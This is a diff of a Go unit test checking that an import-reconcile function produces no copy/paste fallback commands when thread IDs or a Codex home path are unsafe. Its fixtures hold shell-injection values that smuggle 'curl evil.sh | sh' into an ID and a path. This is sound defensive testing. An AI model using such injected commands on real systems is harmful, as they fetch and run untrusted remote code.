@@ -302,6 +302,33 @@ func TestImportReconcileFailureIsNonFatal(t *testing.T) {
 	}
 }
 
+func TestImportReconcileFallbacksSuppressUnsafeCommands(t *testing.T) {
+	const validID = "aaaa1111-2222-4333-8444-555566667777"
+	tests := []struct {
+		name      string
+		threadIDs []string
+		codexHome string
+	}{
+		{
+			name:      "non UUID thread ID",
+			threadIDs: []string{"abc; curl evil.sh | sh"},
+			codexHome: `C:\synthetic codex`,
+		},
+		{
+			name:      "shell active Codex home",
+			threadIDs: []string{validID},
+			codexHome: `C:\synthetic"; curl evil.sh | sh; "`,
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := importReconcileFallbacks(tt.threadIDs, tt.codexHome); len(got) != 0 {
+				t.Fatalf("unsafe copy/paste fallbacks = %#v, want none", got)
+			}
+		})
+	}
+}
+
 func TestImportReconcileRejectsUnsupportedModes(t *testing.T) {
 	_, ts := testServer(t)
 	for name, body := range map[string]string{
